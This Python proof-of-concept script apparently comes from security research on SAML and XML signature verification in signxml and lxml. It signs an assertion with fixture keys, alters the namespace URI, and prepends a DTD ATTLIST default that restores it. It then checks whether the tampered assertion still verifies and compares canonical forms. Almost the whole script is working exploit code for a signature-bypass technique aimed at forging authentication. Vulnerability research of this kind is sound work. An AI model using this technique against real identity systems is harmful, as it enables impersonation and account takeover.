"""Re-verify the original DTD ATTLIST PoC to understand the EXACT mechanism."""
import os
from lxml import etree
from signxml import XMLSigner, XMLVerifier
from signxml.algorithms import SignatureConstructionMethod
from cryptography.hazmat.primitives.serialization import load_pem_private_key

FIXTURES = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'targets', 'saml_fixtures')
with open(os.path.join(FIXTURES, 'idp_key.pem'), 'rb') as f:
    KEY = load_pem_private_key(f.read(), password=None)
with open(os.path.join(FIXTURES, 'idp_cert.pem'), 'rb') as f:
    CERT = f.read()

SAML = "urn:oasis:names:tc:SAML:2.0:assertion"

# Step 1: Create and sign assertion
print("=== Step 1: Sign assertion ===")
assertion = etree.fromstring(
    f'<saml:Assertion xmlns:saml="{SAML}" Version="2.0" ID="_test"'
    f' IssueInstant="2026-03-01T00:00:00Z">'
    f'<saml:Subject><saml:NameID>admin@example.com</saml:NameID></saml:Subject>'
    f'</saml:Assertion>'.encode()
)

signer = XMLSigner(
    method=SignatureConstructionMethod.enveloped,
    c14n_algorithm='http://www.w3.org/2001/10/xml-exc-c14n#',
)
signed = signer.sign(assertion, key=KEY, cert=CERT)
signed_xml = etree.tostring(signed)

print(f"Signed bytes (first 200): {signed_xml[:200]}")
print(f"  Has explicit xmlns:saml: {b'xmlns:saml=' in signed_xml}")

# Check how many times xmlns:saml appears
count = signed_xml.count(b'xmlns:saml=')
print(f"  xmlns:saml count: {count}")

# Step 2: Tamper namespace (byte replace)
print("\n=== Step 2: Tamper namespace ===")
tampered = signed_xml.replace(b'SAML:2.0:assertion', b'SAML:2.0:Assertion')
print(f"Tampered bytes (first 200): {tampered[:200]}")

# Check what the tampered bytes look like
ns_positions = []
idx = 0
while True:
    pos = tampered.find(b'xmlns:saml=', idx)
    if pos == -1:
        break
    end = tampered.find(b'"', pos + 12) + 1
    ns_positions.append((pos, tampered[pos:end]))
    idx = pos + 1

print(f"  xmlns:saml occurrences after tamper:")
for pos, val in ns_positions:
    print(f"    @{pos}: {val}")

# Step 3: Add DTD
print("\n=== Step 3: Add DTD and parse ===")
attack = (
    b'<!DOCTYPE x [<!ATTLIST saml:Assertion xmlns:saml '
    b'CDATA "urn:oasis:names:tc:SAML:2.0:assertion">]>'
    + tampered
)

parsed = etree.fromstring(attack)
print(f"  Parsed root tag: {parsed.tag}")
print(f"  Parsed root nsmap: {parsed.nsmap}")

# Check if NameID is findable with correct NS
nameid = parsed.find('.//{%s}NameID' % SAML)
print(f"  NameID findable with correct NS: {nameid is not None}")
if nameid is not None:
    print(f"  NameID text: {nameid.text}")
    print(f"  NameID tag: {nameid.tag}")

# Also try with wrong NS
nameid_wrong = parsed.find('.//{urn:oasis:names:tc:SAML:2.0:Assertion}NameID')
print(f"  NameID findable with WRONG NS: {nameid_wrong is not None}")

# Step 4: Verify signature
print("\n=== Step 4: Verify signature ===")
try:
    result = XMLVerifier().verify(attack, x509_cert=CERT)
    print(f"  SIGNATURE VALID!")
    ns_el = result.signed_xml.find('.//{%s}NameID' % SAML)
    if ns_el is not None:
        print(f"  Signed NameID: {ns_el.text}")
        print(f"  Signed element tag: {result.signed_xml.tag}")
except Exception as e:
    print(f"  SIGNATURE FAIL: {e}")

# Step 5: Compare c14n
print("\n=== Step 5: C14N comparison ===")

# Original (correct NS)
orig = etree.fromstring(signed_xml)
# Remove signature for c14n comparison
sig_el = orig.find('{http://www.w3.org/2000/09/xmldsig#}Signature')
if sig_el is not None:
    orig.remove(sig_el)
c14n_orig = etree.tostring(orig, method="c14n", exclusive=True)

# Attack (DTD-processed)
attack_parsed = etree.fromstring(attack)
sig_el2 = attack_parsed.find('{http://www.w3.org/2000/09/xmldsig#}Signature')
if sig_el2 is not None:
    attack_parsed.remove(sig_el2)
c14n_attack = etree.tostring(attack_parsed, method="c14n", exclusive=True)

print(f"  c14n original: {c14n_orig[:150]}")
print(f"  c14n attack:   {c14n_attack[:150]}")
print(f"  MATCH: {c14n_orig == c14n_attack}")

# Step 6: What about without DTD?
print("\n=== Step 6: Without DTD ===")
try:
    result2 = XMLVerifier().verify(tampered, x509_cert=CERT)
    print(f"  WITHOUT DTD: SIGNATURE VALID (unexpected!)")
except Exception as e:
    print(f"  WITHOUT DTD: SIGNATURE FAIL: {str(e)[:80]}")
